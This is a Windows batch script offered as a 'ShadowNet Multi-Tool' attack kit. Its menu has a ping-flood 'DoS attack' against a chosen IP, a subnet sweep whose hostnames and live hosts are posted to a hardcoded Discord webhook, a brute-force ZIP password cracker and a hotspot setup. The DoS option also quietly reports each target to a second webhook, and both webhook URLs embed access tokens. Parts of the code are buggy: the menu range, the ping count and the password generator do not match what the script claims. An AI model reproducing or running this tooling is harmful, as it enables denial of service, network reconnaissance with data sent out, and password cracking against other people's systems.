@echo off
title ShadowNet Multi-Tool
cls
color D
:MENU
:: Print the title and menu options
cls
echo.
echo                                      ShadowNet Multi-Tool
echo                                      Simplified for efficiency and style.
echo.
echo                                      ------------------------------------------
echo                                      Welcome to ShadowNet Multi-Tool      
echo                                      ------------------------------------------
echo                                      1. Check System Information
echo                                      2. DoS attack
echo                                      3. Check IP Address
echo                                      4. NETFLUBBER
echo                                      5. FAKEWIFI
echo                                      6. ZIPPIEDIPPIE
echo                                      7. Exit
echo                                      ------------------------------------------
echo.

:: Input prompt
set /p "option=                                      Choose an option (1-8): "

:: Validate input and route accordingly
if "%option%"=="" goto INVALID_INPUT
if "%option%"=="1" goto SYSTEMINFO
if "%option%"=="2" goto PING
if "%option%"=="3" goto IPCHECK
if "%option%"=="4" goto SCAN_NETWORK
if "%option%"=="5" goto WIFI_HOTSPOT
if "%option%"=="6" goto CRACKER
if "%option%"=="7" goto EXIT
goto INVALID_INPUT

:INVALID_INPUT
echo                                      Invalid input. Please try again.
pause
goto MENU

:SYSTEMINFO
echo                                      ------------------------------------------
echo                                      Checking System Information...
echo                                      ------------------------------------------
systeminfo
pause
goto MENU

:: Check if the input is empty
:PING
cls
echo                                      ------------------------------------------
echo                                      Enter the IP address to DoS attack (e.g., 192.168.1.1):
echo                                      ------------------------------------------
set /p ip=

:: Check if the input is empty
if "%ip%"=="" (
    echo                                      Invalid input. Please enter a valid IP address.
    pause
    goto PING
)

:: Ask for the byte size
echo                                      ------------------------------------------
set /p "bytes=                                      Enter the number of bytes to send (default 32, max 65500): "
if "%bytes%"=="" set bytes=32

:: Ensure the byte size does not exceed the maximum allowed value
if %bytes% gtr 65500 (
    echo                                      Maximum allowed size is 65,500 bytes. Reducing to 65,500 bytes.
    set bytes=65500
)
:: Send a Discord notification using a webhook
echo Sending notification to Discord...
set webhook_url=https://discord.com/api/webhooks/1330043207412748450/LsxuZb6v5usLSOUzQp309TT70F6BAl1KV2cCiV4IY_-zth7wqkznCDBtiLoLsjlFVzTN
set message={"content":"IP Pinger Used!:). Target IP: %ip%, Bytes: %bytes%."}

:: Escape special characters for the curl command
set "escaped_message={\"content\":\"DoS attacker. Target IP: %ip%, Bytes: %bytes%.\"}"

curl -H "Content-Type: application/json" -X POST -d "%escaped_message%" %webhook_url%

echo                                      ------------------------------------------
echo                                      Sending 4 pings to %ip% with %bytes% bytes...
echo.

:: Loop to repeat the ping command 4 times
for /L %%i in (1,1,6000) do (
    echo Ping attempt %%i:
    ping -n 1 -l %bytes% %ip%
    echo.
)

echo                                      ------------------------------------------
echo                                      Dos attack has been completed :)
pause
goto MENU

:IPCHECK
echo                                      ------------------------------------------
echo                                      Checking your external IP address...
echo                                      ------------------------------------------
curl ifconfig.me
pause
goto MENU

:SCAN_NETWORK
cls
echo                                      ------------------------------------------
echo                                      FLUBBING IP RNNNNNNN
echo                                      ------------------------------------------

:: Enable delayed expansion
setlocal enabledelayedexpansion

:: Retrieve the current subnet
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr "IPv4 Address"') do set "local_ip=%%i"
set "local_ip=%local_ip: =%"
for /f "tokens=1-3 delims=." %%a in ("%local_ip%") do set "subnet=%%a.%%b.%%c"

echo Detected subnet: %subnet%.0
echo                                      ------------------------------------------

:: Prepare the results for Discord
set "results=Active devices on the network:\n"

:: Loop through the IP range and check for active devices
for /L %%i in (1,1,254) do (
    set "ip=%subnet%.%%i"
    ping -n 1 -w 500 !ip! | find "Reply from" >nul
    if not errorlevel 1 (
        echo [ACTIVE] !ip!
        set "results=!results![ACTIVE] !ip!\n"
        for /f "tokens=2 delims=:" %%n in ('nbtstat -A !ip! ^| findstr "Name"') do (
            echo Hostname: %%n
            set "results=!results!    Hostname: %%n\n"
        )
    )
)

:: Escape the Discord message for JSON
set "escaped_results="
for /f "delims=" %%C in ("!results!") do set "escaped_results=!escaped_results!%%C"

:: Send results to Discord
set webhook_url=https://discord.com/api/webhooks/1330050051191476265/LmmeyXk-B4z_nivugp4Fqaau81vV8fopFx7UuNb_y64IFa4wBuq9dtV4qJaiGk-ZUQN9
echo Sending results to Discord...
curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"!escaped_results!\"}" %webhook_url%

echo                                      ------------------------------------------
echo FLUBBED.
pause
goto MENU

:WIFI_HOTSPOT
echo                                      ------------------------------------------
echo                                      Setting up a Wi-Fi Hotspot...
echo                                      ------------------------------------------
set /p "ssid=                                      Enter the name (SSID) of your network: "
set /p "password=                                      Enter the password for your network (min 8 characters): "

:: Configure the hotspot
netsh wlan set hostednetwork mode=allow ssid=%ssid% key=%password%

:: Start the hotspot
netsh wlan start hostednetwork

echo                                      ------------------------------------------
echo                                      Hotspot created successfully!
echo                                      SSID: %ssid%
echo                                      Password: %password%
echo                                      ------------------------------------------
pause
goto MENU

:CRACKER
echo                                      ------------------------------------------
echo                                      ZIP Password Cracker
echo                                      ------------------------------------------

:: Path to 7-Zip executable
set "SEVENZIP=7z.exe"

:: Path to the ZIP file
set /p "ZIPFILE=                                      Enter the path to the ZIP file: "

:: Characters to try (lowercase letters and digits)
set "CHARACTERS=abcdefghijklmnopqrstuvwxyz0123456789"

:: Minimum and maximum password length
set MIN_LENGTH=4
set MAX_LENGTH=6

:: Start brute force
echo                                      Starting brute force on %ZIPFILE%...
echo                                      Using characters: %CHARACTERS%

for /l %%L in (%MIN_LENGTH%,1,%MAX_LENGTH%) do (
    call :generate_passwords %%L
)

echo                                      [FAILED] Password not found within given range.
pause
goto MENU

:generate_passwords
:: Generate all combinations of characters for the specified length
:: %1 = current length
setlocal enabledelayedexpansion
set LENGTH=%1

:: Initialize counters
for /l %%A in (0,1,0) do (
    set "TEMP_PASSWORD="
    for %%B in (%CHARACTERS%) do (
        set "TEMP_PASSWORD=!TEMP_PASSWORD!%%B"
        call :attempt_password !TEMP_PASSWORD!
    )
)
exit /b

:attempt_password
:: Test the current password
:: %1 = password
echo                                      Trying password: %1

%SEVENZIP% t -p%1 "%ZIPFILE%" >nul 2>&1
if !errorlevel! equ 0 (
    echo                                      [SUCCESS] Password found: %1
    pause
    exit /b
)
exit /b

:EXIT
echo                                      ------------------------------------------
echo                                      Exiting the program. Goodbye!
echo                                      ------------------------------------------
exit
